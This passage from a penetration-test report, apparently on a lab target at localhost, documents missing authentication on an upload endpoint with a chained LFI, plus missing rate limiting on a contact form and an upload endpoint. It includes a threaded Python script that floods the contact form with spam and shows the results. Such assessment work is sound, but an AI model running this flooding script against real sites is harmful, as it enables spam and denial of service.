The endpoint processes uploads starting at line 8 without any `session_start()`, password verification, or access control checks. While `.htaccess` prevents direct PHP execution in the uploads directory, files can still be included via the LFI vulnerability in post.php.\\n\\n---\\n\\n### AUTH-VULN-02: Missing Rate Limiting on Contact Form\\n\\n**Summary:**\\n- **Vulnerable location:** POST /contact.php\\n- **Current State:** No rate limiting, CAPTCHA, or abuse prevention controls exist\\n- **Impact:** Enables automated spam flooding, resource exhaustion, and denial of service attacks. Attackers can submit unlimited automated requests.\\n- **Severity:** High\\n\\n**Prerequisites:** None - endpoint is publicly accessible\\n\\n**Exploitation Steps:**\\n\\n1. **Create automated spam attack script**\\n```python\\n# File: test_rate_limiting.py\\nimport requests\\nimport time\\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\\n\\nurl = \\\"http://localhost:36367/contact.php\\\"\\nnum_requests = 50\\n\\ndef send_request(i):\\n    data = {\\n        'name': f'Spam Bot {i}',\\n        'email': f'spam{i}@test.com',\\n        'message': f'Automated spam message {i}'\\n    }\\n    try:\\n        response = requests.post(url, data=data, timeout=10)\\n        return {'num': i, 'status': response.status_code, 'success': 'Thank you' in response.text}\\n    except Exception as e:\\n        return {'num': i, 'status': 0, 'error': str(e)}\\n\\nstart_time = time.time()\\nresults = []\\n\\nwith ThreadPoolExecutor(max_workers=10) as executor:\\n    futures = [executor.submit(send_request, i) for i in range(1, num_requests + 1)]\\n    for future in as_completed(futures):\\n        results.append(future.result())\\n\\nend_time = time.time()\\nduration = end_time - start_time\\n\\n# Calculate statistics\\nsuccessful = sum(1 for r in results if r.get('status') == 200)\\nrate_limited = sum(1 for r in results if r.get('status') == 429)\\n\\nprint(f\\\"\\\\nTotal Requests: {num_requests}\\\")\\nprint(f\\\"Successful (HTTP 200): {successful}/{num_requests}\\\")\\nprint(f\\\"Rate Limited (HTTP 429): {rate_limited}\\\")\\nprint(f\\\"Average Rate: {num_requests/duration:.2f} requests/second\\\")\\n```\\n\\n2. **Execute the automated attack**\\n```bash\\ncd /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-028-24/\\npython test_rate_limiting.py\\n```\\n\\n**Proof of Impact:**\\n\\nAutomated attack results:\\n- **Total Requests Sent:** 50\\n- **Successful Submissions (HTTP 200):** 50/50 (100%)\\n- **Rate Limited (HTTP 429):** 0\\n- **Other Errors:** 0\\n- **Average Request Rate:** 675.17 requests/second\\n- **Total Time:** 0.07 seconds\\n\\nAll 50 rapid POST requests succeeded without any rate limiting or throttling. The application processed over 675 requests per second with no protective controls.\\n\\n**Notes:**\\nCode analysis at `/var/www/html/contact.php` lines 7-33 confirmed no rate limiting functions, no CAPTCHA implementation, and no abuse prevention controls. Apache configuration also lacks mod_evasive or mod_security modules. This enables trivial automated spam and resource exhaustion attacks.\\n\\n---\\n\\n### AUTH-VULN-03: Missing Rate Limiting on File Upload Endpoint\\n\\n**Summary:**\\n- **Vulnerable location:** POST /posts/upload-article.php\\n- **Current State:** No rate limiting on file uploads, no upload quota, no per-IP throttling\\n- **Impact:** Enables upload flooding for storage exhaustion and denial of service.

Server processed over 1,000 uploads per second without restriction.\\n\\n**Attack Scenario:**\\nAn attacker can:\\n1. Upload thousands of files rapidly to exhaust disk space\\n2. Cause denial of service through storage exhaustion\\n3. Overwhelm server resources with concurrent upload processing\\n4. Generate excessive cloud storage costs if deployed on cloud infrastructure\\n\\n**Notes:**\\nCombined with AUTH-VULN-01 (no authentication) and no file type validation, this enables trivial DoS attacks. Code at `/var/www/html/posts/upload-article.php` lines 8-36 has no rate limiting, no upload quota checks, and no per-IP throttling. The `upload_max_filesize` is 2MB but no limit exists on number of uploads.\\n\\n---\\n\\n## Out of Scope Vulnerabilities (Require Internal Access)\\n\\nThe following vulnerabilities are valid security issues but cannot be exploited via the external network interface at http://localhost:36367.
